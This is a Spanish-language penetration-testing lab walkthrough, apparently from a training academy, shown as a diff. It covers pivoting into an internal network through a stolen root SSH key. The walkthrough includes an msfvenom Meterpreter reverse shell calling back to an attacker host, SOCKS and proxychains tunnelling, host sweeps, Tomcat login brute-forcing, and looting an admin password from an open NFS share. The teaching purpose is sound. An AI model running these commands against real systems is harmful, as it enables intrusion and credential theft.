@@ -1,0 +1,597 @@
+---
+
+Hemos cubierto una tonelada de terreno hasta ahora:
+
+- Realizamos la recopilación de información externa.
+- Realizamos el escaneo de puertos y servicios externos.
+- Enumeramos múltiples servicios para detectar configuraciones incorrectas y vulnerabilidades conocidas.
+- Enumeramos y atacamos 12 diferentes aplicaciones web, algunas resultaron en acceso a archivos o datos sensibles, y unas pocas resultaron en la ejecución remota de código en el servidor web subyacente.
+- Obtenimos un acceso difícil en la red interna.
+- Realizamos saqueos y movimiento lateral para obtener acceso como un usuario más privilegiado.
+- Escalamos privilegios a root en el servidor web.
+- Establecimos persistencia mediante el uso de un par de usuario/contraseña y la clave privada de la cuenta root para un acceso rápido por SSH de vuelta al entorno.
+
+---
+
+## Setting Up Pivoting - SSH
+
+Con una copia del archivo `id_rsa` (clave privada) de root, podemos usar el reenvío de puertos de SSH junto con [ProxyChains](https://github.com/haad/proxychains) para comenzar a obtener una imagen de la red interna. Para revisar esta técnica, consulta la sección [Dynamic Port Forwarding with SSH and SOCKS Tunneling](https://academy.hackthebox.com/module/158/section/1426) del módulo `Pivoting, Tunneling, and Port Forwarding`.
+
+Podemos usar el siguiente comando para configurar nuestro pivote de SSH utilizando el reenvío de puerto dinámico: `ssh -D 8081 -i dmz01_key root@10.129.x.x`. Esto significa que podemos hacer proxy de tráfico desde nuestro host de ataque a través del puerto 8081 en el objetivo para llegar a los hosts dentro de la subred 172.16.8.0/23 directamente desde nuestro host de ataque.
+
+En nuestra primera terminal, configuremos primero el comando de reenvío de puerto dinámico de SSH:
+
+
+
+```r
+ssh -D 8081 -i dmz01_key root@10.129.203.111
+
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed 22 Jun 2022 12:08:31 AM UTC
+
+  System load:                      0.21
+  Usage of /:                       99.9% of 13.72GB
+  Memory usage:                     65%
+  Swap usage:                       0%
+  Processes:                        458
+  Users logged in:                  2
+  IPv4 address for br-65c448355ed2: 172.18.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for ens160:          10.129.203.111
+  IPv6 address for ens160:          dead:beef::250:56ff:feb9:d30d
+  IPv4 address for ens192:          172.16.8.120
+
+  => / is using 99.9% of 13.72GB
+
+ * Super-optimized for small spaces - read how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
+
+   https://ubuntu.com/blog/microk8s-memory-optimisation
+
+97 updates can be applied immediately.
+30 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+
+You have mail.
+Last login: Tue Jun 21 19:53:01 2022 from 10.10.14.15
+root@dmz01:~#
+```
+
+Podemos confirmar que el reenvío de puerto dinámico está configurado utilizando `Netstat` o ejecutando un escaneo Nmap contra nuestra dirección localhost.
+
+
+
+```r
+netstat -antp | grep 8081
+
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+tcp        0      0 127.0.0.1:8081          0.0.0.0:*               LISTEN      122808/ssh          
+tcp6       0      0 ::1:8081
+```
+
+A continuación, necesitamos modificar el archivo `/etc/proxychains.conf` para usar el puerto que especificamos con nuestro comando de reenvío de puerto dinámico (8081 aquí).
+
+Nota: Si estás trabajando desde Pwnbox, asegúrate de guardar esta clave privada en tus notas o en un archivo local, o tendrás que rehacer todos los pasos para volver a este punto si decides pausar por un tiempo.
+
+
+
+```r
+grep socks4 /etc/proxychains.conf 
+
+#	 	socks4	192.168.1.49	1080
+#       proxy types: http, socks4, socks5
+socks4 	127.0.0.1 8081
+```
+
+A continuación, podemos usar Nmap con Proxychains para escanear el host dmz01 en su segunda NIC, con la dirección IP `172.16.8.120` para asegurarnos de que todo esté configurado correctamente.
+
+
+
+```r
+proxychains nmap -sT -p 21,22,80,8080 172.16.8.120
+
+ProxyChains-3.1 (http://proxychains.sf.net)
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-21 21:15 EDT
+|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:80-<><>-OK
+|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:80-<><>-OK
+|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:22-<><>-OK
+|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:21-<><>-OK
+|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:8080-<><>-OK
+Nmap scan report for 172.16.8.120
+Host is up (0.13s latency).
+
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
+```
+
+---
+
+## Setting Up Pivoting - Metasploit
+
+Alternativamente, podemos configurar nuestro pivote utilizando Metasploit, como se cubre en la sección [Meterpreter Tunneling & Port Forwarding](https://academy.hackthebox.com/module/158/section/1428) del módulo Pivoting. Para lograr esto, podemos hacer lo siguiente:
+
+Primero, generamos una shell inversa en formato Elf utilizando `msfvenom`.
+
+
+
+```r
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=443 -f elf > shell.elf
+
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 123 bytes
+Final size of elf file: 207 bytes
+
+```
+
+A continuación, transferimos el host al objetivo. Como tenemos SSH, podemos subirlo al objetivo usando SCP.
+
+
+
+```r
+scp -i dmz01_key shell.elf root@10.129.203.111:/tmp
+
+shell.elf                                                                      100%  207     1.6KB/s   00:00
+```
+
+Ahora, configuraremos el `exploit/multi/handler` de Metasploit.
+
+
+
+```r
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload linux/x86/meterpreter/reverse_tcp
+payload => linux/x86/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 10.10.14.15 
+lhost => 10.10.14.15
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 443
+LPORT => 443
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit
+
+[*] Started reverse TCP handler on 10.10.14.15:443
+```
+
+Ejecuta el archivo `shell.elf` en el sistema objetivo:
+
+
+
+```r
+root@dmz01:/tmp# chmod +x shell.elf 
+root@dmz01:/tmp# ./shell.elf 
+```
+
+Si todo va según lo planeado, atraparemos la shell de Meterpreter usando el multi/handler, y luego podemos configurar las rutas.
+
+
+
+```r
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit
+
+[*] Started reverse TCP handler on 10.10.14.15:443 
+[*] Sending stage (989032 bytes) to 10.129.203.111
+[*] Meterpreter session 1 opened (10.10.14.15:443 -> 10.129.203.111:58462 ) at 2022-06-21 21:28:43 -0400
+
+(Meterpreter 1)(/tmp) > getuid
+Server username: root
+```
+
+A continuación, podemos configurar el enrutamiento utilizando el módulo `post/multi/manage/autoroute`.
+
+
+
+```r
+(Meterpreter 1)(/tmp) > background
+[*] Backgrounding session 1...
+[msf](Jobs:0 Agents:1) exploit(multi/handler) >> use post/multi/manage/autoroute 
+[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> show options 
+
+Module options (post/multi/manage/autoroute):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, de
+                                       fault)
+   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
+   SESSION                   yes       The session to run this module on
+   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)
+
+[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set SESSION 1
+SESSION => 1
+[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set subnet 172.16.8.0
+subnet => 172.16.8.0
+[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> run
+
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: linux
+[*] Running module against 10.129.203.111
+[*] Searching for subnets to autoroute.
+[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
+[+] Route added to subnet 172.16.0.0/255.255.0.0 from host's routing table.
+[+] Route added to subnet 172.17.0.0/255.255.0.0 from host's routing table.
+[+] Route added to subnet 172.18.0.0/255.255.0.0 from host's routing table.
+[*] Post module execution completed
+```
+
+Para refrescar la memoria, consulta la sección [Crafting Payloads with MSFvenom](https://academy.hackthebox.com/module/115/section/1205) del módulo `Shells & Payloads` y la sección [Introduction to MSFVenom](https://academy.hackthebox.com/module/39/section/418) del módulo `Using the Metasploit Framework`.
+
+---
+
+## Host Discovery - 172.16.8.0/23 Subnet - Metasploit
+
+Una vez que ambas opciones estén configuradas, podemos comenzar a buscar hosts activos. Utilizando nuestra sesión de Meterpreter, podemos usar el módulo `multi/gather/ping_sweep` para realizar un barrido de ping en la subred `172.16.8.0/23`.
+
+
+
+```r
+[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> use post/multi/gather/ping_sweep
+[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> show options 
+
+Module options (post/multi/gather/ping_sweep):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       IP Range to perform ping sweep against.
+   SESSION                   yes       The session to run this module on
+
+[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> set rhosts 172.16.8.0/23
+rhosts => 172.16.8.0/23
+[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> set SESSION 1
+SESSION => 1
+[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> run
+
+[*] Performing ping sweep for IP range 172.16.8.0/23
+[+] 	172.16.8.3 host found
+[+] 	172.16.8.20 host found
+[+] 	172.16.8.50 host found
+[+] 	172.16.8.120 host found
+```
+
+---
+
+## Host Discovery - 172.16.8.0/23 Subnet - SSH Tunnel
+
+Alternativamente, podríamos hacer un barrido de ping o usar un [Nmap binario estático](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) desde el host dmz01.
+
+Obtenemos resultados rápidos con este barrido de ping de una sola línea en Bash:
+
+
+
+```r
+root@dmz01:~# for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from
+
+64 bytes from 172.16.8.3: icmp_seq=1 ttl=128 time=0.472 ms
+64 bytes from 172.16.8.20: icmp_seq=1 ttl=128 time=0.433 ms
+64 bytes from 172.16.8.120: icmp_seq=1 ttl=64 time=0.031 ms
+64 bytes from 172.16.8.50: icmp_seq=1 ttl=128 time=0.642 ms
+```
+
+También podríamos usar Nmap a través de Proxychains para enumerar hosts en la subred 172.16.8.0/23, pero será muy lento y tardará mucho en terminar.
+
+Nuestro descubrimiento de hosts arroja tres hosts adicionales:
+
+- 172.16.8.3
+- 172.16.8.20
+- 172.16.8.50
+
+Ahora podemos profundizar en cada uno de estos hosts y ver qué encontramos.
+
+---
+
+## Host Enumeration
+
+Continuemos nuestra enumeración utilizando un Nmap binario estático desde el host dmz01. Intenta subir el binario utilizando una de las técnicas enseñadas en el módulo [File Transfers](https://academy.hackthebox.com/module/24/section/159).
+
+
+
+```r
+
+root@dmz01:/tmp# ./nmap --open -iL live_hosts 
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-06-22 01:42 UTC
+Unable to find nmap-services! Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+
+Nmap scan report for 172.16.8.3
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (0.00064s latency).
+Not shown: 1173 closed ports
+PORT    STATE SERVICE
+53/tcp  open  domain
+88/tcp  open  kerberos
+135/tcp open  epmap
+139/tcp open  netbios-ssn
+389/tcp open  ldap
+445/tcp open  microsoft-ds
+464/tcp open  kpasswd
+593/tcp open  unknown
+636/tcp open  ldaps
+MAC Address: 00:50:56:B9:16:51 (Unknown)
+
+Nmap scan report for 172.16.8.20
+Host is up (0.00037s latency).
+Not shown: 1175 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+111/tcp  open  sunrpc
+135/tcp  open  epmap
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+2049/tcp open  nfs
+3389/tcp open  ms-wbt-server
+MAC Address: 00:50:56:B9:EC:36 (Unknown)
+
+Nmap scan report for 172.16.8.50
+Host is up (0.00038s latency).
+Not shown: 1177 closed ports
+PORT     STATE SERVICE
+135/tcp  open  epmap
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+8080/tcp open  http-alt
+MAC Address: 00:50:56:B9:B0:89 (Unknown)
+
+Nmap done: 3 IP addresses (3 hosts up) scanned in 131.36 second
+```
+
+Del output de Nmap, podemos recopilar lo siguiente:
+
+- 172.16.8.3 es un Domain Controller porque vemos puertos abiertos como Kerberos y LDAP. Probablemente podemos dejar esto de lado por ahora ya que es poco probable que sea explotable directamente (aunque podemos volver a eso).
+- 172.16.8.20 es un host Windows, y los puertos `80/HTTP` y `2049/NFS` son particularmente interesantes.
+- 172.16.8.50 es también un host Windows, y el puerto `8080` destaca como no estándar e interesante.
+
+Podríamos ejecutar un escaneo completo de puertos TCP en segundo plano mientras investigamos algunos de estos hosts.
+
+---
+
+## Active Directory Quick Hits - SMB NULL SESSION
+
+Podemos verificar rápidamente el Domain Controller en busca de sesiones nulas de SMB. Si podemos volcar la política de contraseñas y una lista de usuarios, podríamos intentar un ataque de rociado de contraseñas medido. Si conocemos la política de contraseñas, podemos programar nuestros ataques adecuadamente para evitar el bloqueo de cuentas. Si no podemos encontrar nada más, podríamos volver y usar `Kerbrute` para enumerar nombres de usuario válidos de varias listas de usuarios y, después de enumerar (durante una prueba de penetración real) posibles nombres de usuario de la página de LinkedIn de la empresa. Con esta lista en mano, podríamos intentar 1-2 ataques de rociado y esperar un éxito. Si eso todavía no funciona, dependiendo del cliente y el tipo de evaluación, podríamos pedirles la política de contraseñas para evitar bloquear cuentas. También podríamos intentar un ataque de ASREPRoasting si tenemos nombres de usuario válidos, como se discute en el módulo `Active Directory Enumeration & Attacks`.
+
+
+
+```r
+proxychains enum4linux -U -P 172.16.8.3
+
+ProxyChains-3.1 (http://proxychains.sf.net)
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jun 21 21:49:47 2022
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 172.16.8.3
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ================================================== 
+|    Enumerating Workgroup/Domain on 172.16.8.3    |
+ ================================================== 
+[E] Can't find workgroup/domain
+
+
+ =================================== 
+|    Session Check on 172.16.8.3    |
+ =================================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
+[+] Server 172.16.8.3 allows sessions using username '', password ''
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
+[+] Got domain/workgroup name: 
+
+ ========================================= 
+|    Getting domain SID for 172.16.8.3    |
+ ========================================= 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
+|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.3:445-<><>-OK
+Domain Name: INLANEFREIGHT
+Domain Sid: S-1-5-21-2814148634-3729814499-1637837074
+[+] Host is part of a domain (not a workgroup)
+
+ =========================== 
+|    Users on 172.16.8.3    |
+ =========================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
+[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED
+
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
+[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED
+
+ ================================================== 
+|    Password Policy Information for 172.16.8.3    |
+ ================================================== 
+[E] Unexpected error from polenum:
+|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.3:139-<><>-OK
+|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.3:445-<><>-OK
+
+
+[+] Attaching to 172.16.8.3 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+	[!] Protocol failed: Cannot request session (Called Name:172.16.8.3)
+
+[+] Trying protocol 445/SMB...
+
+	[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.
+
+[E] Failed to get password policy with rpcclient
+
+enum4linux complete on Tue Jun 21 21:50:07 2022
+```
+
+Desafortunadamente para nosotros, esto es un callejón sin salida.
+
+---
+
+## 172.16.8.50 - Tomcat
+
+Nuestro escaneo Nmap anterior mostró el puerto 8080 abierto en este host. Al navegar a `http://172.16.8.50:8080`, vemos la última versión de Tomcat 10 instalada. Aunque no hay exploits públicos para ello, podemos intentar forzar la autenticación del Tomcat Manager como se muestra en la sección [Attacking Tomcat](https://academy.hackthebox.com/module/113/section/1211) del módulo `Attacking Common Applications`. Podemos iniciar otra instancia de Metasploit usando Proxychains escribiendo `proxychains msfconsole` para poder pivotar a través del host dmz01 comprometido si no tenemos el enrutamiento configurado a través de una sesión de Meterpreter. Luego podemos usar el módulo `auxiliary/scanner/http/tomcat_mgr_login` para intentar forzar la autenticación.
+
+
+
+```r
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 172.16.8.50
+rhosts => 172.16.8.50
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
+stop_on_success => true
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
+|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
+
+[!] No active DB -- Credential data will not be saved!
+[-] 172.16.8.50:8080 - LOGIN FAILED: admin:admin (Incorrect)
+|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
+|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
+|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
+[-] 172.16.8.50:8080 - LOGIN FAILED: admin:manager (Incorrect)
+|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
+|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
+|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
+[-] 172.16.8.50:8080 - LOGIN FAILED: admin:role1 (Incorrect)
+
+<SNIP>
+
+|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
+[-] 172.16.8.50:8080 - LOGIN FAILED: tomcat:changethis (Incorrect)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+No obtenemos una autenticación exitosa, por lo que esto parece ser un callejón sin salida y no vale la pena explorar más. Si encontráramos una página de autenticación de Tomcat Manager expuesta a Internet, probablemente querríamos registrarlo como un hallazgo, ya que un atacante podría forzar la autenticación y usarla para obtener acceso inicial. Durante una interna, solo querríamos reportarlo si pudiéramos entrar con credenciales débiles y subir una shell web JSP. De lo contrario, verlo en una red interna es normal si está bien bloqueado.
+
+---
+
+## Enumerating 172.16.8.20 - DotNetNuke (DNN
+
+)
+
+Del escaneo de Nmap, vimos los puertos `80` y `2049` abiertos. Vamos a investigar cada uno de estos. Podemos ver qué hay en el puerto 80 usando `cURL` desde nuestro host de ataque con el comando `proxychains curl http://172.16.8.20`. Desde la respuesta HTTP, parece que [DotNetNuke (DNN)](https://www.dnnsoftware.com/) está ejecutándose en el objetivo. Este es un CMS escrito en .NET, básicamente el WordPress de .NET. Ha sufrido algunas fallas críticas a lo largo de los años y también tiene algunas funcionalidades integradas de las que podríamos aprovechar. Podemos confirmar esto navegando directamente al objetivo desde nuestro host de ataque, pasando el tráfico a través del proxy SOCKS.
+
+Podemos configurarlo en Firefox de la siguiente manera:
+
+![text](https://academy.hackthebox.com/storage/modules/163/ff_socks.png)
+
+Navegar a la página confirma nuestras sospechas.
+
+![text](https://academy.hackthebox.com/storage/modules/163/dnn_homepage.png)
+
+Navegar a `http://172.16.8.20/Login?returnurl=%2fadmin` nos muestra la página de inicio de sesión del administrador. También hay una página para registrar un usuario. Intentamos registrar una cuenta pero recibimos el mensaje:
+
+`An email with your details has been sent to the Site Administrator for verification. You will be notified by email when your registration has been approved. In the meantime you can continue to browse this site.`
+
+En mi experiencia, es muy poco probable que cualquier tipo de administrador del sitio apruebe un registro extraño, aunque vale la pena intentar cubrir todas nuestras bases.
+
+Dejando de lado DNN por ahora, volvemos a los resultados de nuestro escaneo de puertos. El puerto 2049, NFS, siempre es interesante de ver. Si el servidor NFS está mal configurado (lo cual es común internamente), podemos explorar los compartidos NFS y potencialmente descubrir algunos datos sensibles. Como este es un servidor de desarrollo (debido a la instalación de DNN en proceso y el nombre de host `DEV01`), vale la pena investigarlo. Podemos usar [showmount](https://linux.die.net/man/8/showmount) para listar exportaciones, que podríamos montar y explorar similar a cualquier otro archivo compartido. Encontramos una exportación, `DEV01`, que es accesible para todos (acceso anónimo). Veamos qué contiene.
+
+
+
+```r
+proxychains showmount -e 172.16.8.20
+
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:111-<><>-OK
+|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:2049-<><>-OK
+Export list for 172.16.8.20:
+/DEV01 (everyone)
+```
+
+No podemos montar el compartido NFS a través de Proxychains, pero afortunadamente tenemos acceso root al host dmz01 para intentarlo. Vemos algunos archivos relacionados con DNN y un subdirectorio `DNN`.
+
+
+
+```r
+root@dmz01:/tmp# mkdir DEV01
+root@dmz01:/tmp# mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
+root@dmz01:/tmp# cd DEV01/
+root@dmz01:/tmp/DEV01# ls
+
+BuildPackages.bat            CKToolbarButtons.xml  DNN       WatchersNET.CKEditor.sln
+CKEditorDefaultSettings.xml  CKToolbarSets.xml     
+```
+
+El subdirectorio `DNN` es muy interesante ya que contiene un archivo `web.config`. A partir de nuestras discusiones sobre saqueos a lo largo del `Penetration Tester Path`, sabemos que los archivos de configuración a menudo contienen credenciales, lo que los convierte en un objetivo clave durante cualquier evaluación.
+
+
+
+```r
+root@dmz01:/tmp/DEV01# cd DNN
+root@dmz01:/tmp/DEV01/DNN# ls
+
+App_LocalResources                CKHtmlEditorProvider.cs  Options.aspx                 Web
+Browser                           Constants                Options.aspx.cs              web.config
+bundleconfig.json                 Content                  Options.aspx.designer.cs     web.Debug.config
+CKEditorOptions.ascx              Controls                 packages.config              web.Deploy.config
+CKEditorOptions.ascx.cs           Extensions               Properties                   web.Release.config
+CKEditorOptions.ascx.designer.cs  Install                  UrlControl.ascx
+CKEditorOptions.ascx.resx         Module                   Utilities
+CKFinder                          Objects                  WatchersNET.CKEditor.csproj
+
+root@dmz01:/tmp/DEV01/DNN# 
+```
+
+Al revisar el contenido del archivo web.config, encontramos lo que parece ser la contraseña del administrador para la instancia de DNN.
+
+
+
+```r
+root@dmz01:/tmp/DEV01/DNN# cat web.config 
+
+<?xml version="1.0"?>
+<configuration>
+  <!--
+    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.
+
+    The following attributes can be set on the <httpRuntime> tag.
+      <system.Web>
+        <httpRuntime targetFramework="4.6.2" />
+      </system.Web>
+  -->
+  <username>Administrator</username>
+  <password>
+	<value>D0tn31Nuk3R0ck$$@123</value>
+  </password>
+  <system.web>
+    <compilation debug="true" targetFramework="4.5.2"/>
+    <httpRuntime targetFramework="4.5.2"/>
+  </system.web>
+```
+
+Antes de continuar, ya que tenemos acceso root en `dmz01` a través de SSH, podemos ejecutar `tcpdump` ya que está en el sistema. Nunca está de más "escuchar en la red" siempre que sea posible durante una prueba de penetración y ver si podemos capturar credenciales en texto claro o descubrir cualquier información adicional que pueda ser útil para nosotros. Generalmente haremos esto durante una Prueba de Penetración Interna cuando tenemos nuestra propia laptop física o una VM que controlamos dentro de la red del cliente. Algunos testers ejecutarán una captura de paquetes todo el tiempo (rara vez, los clientes incluso solicitarán esto), mientras que otros lo ejecutarán periódicamente durante el primer día o así para ver si pueden capturar algo.
+
+
+
+```r
+root@dmz01:/tmp# tcpdump -i ens192 -s 65535 -w ilfreight_pcap
+
+tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 65535 bytes
+^C2027 packets captured
+2033 packets received by filter
+0 packets dropped by kernel
+```
+
+Ahora podríamos transferir esto a nuestro host y abrirlo en `Wireshark` para ver si capturamos algo. Esto se cubre brevemente en la sección [Interacting with Users](https://academy.hackthebox.com/module/67/section/630) del módulo `Windows Privilege Escalation`. Para un estudio más profundo, consulta el módulo [Intro to Network Traffic Analysis](https://academy.hackthebox.com/module/details/81).
+
+Después de transferir el archivo a nuestro host, lo abrimos en Wireshark pero vemos que no se capturó nada. Si estuviéramos en una VLAN de usuario u otra área "ocupada" de la red, podríamos tener una cantidad considerable de datos para analizar, por lo que siempre vale la pena intentarlo.
+
+---
+
+## Moving On
+
+En este punto, hemos investigado los otros hosts "activos" que podemos alcanzar e intentamos capturar tráfico de red. Podríamos ejecutar un escaneo completo de puertos de estos hosts también, pero tenemos suficiente para avanzar por ahora. Veamos qué podemos hacer con las credenciales de DNN que obtuvimos del archivo `web.config` saqueado del compartido NFS abierto.
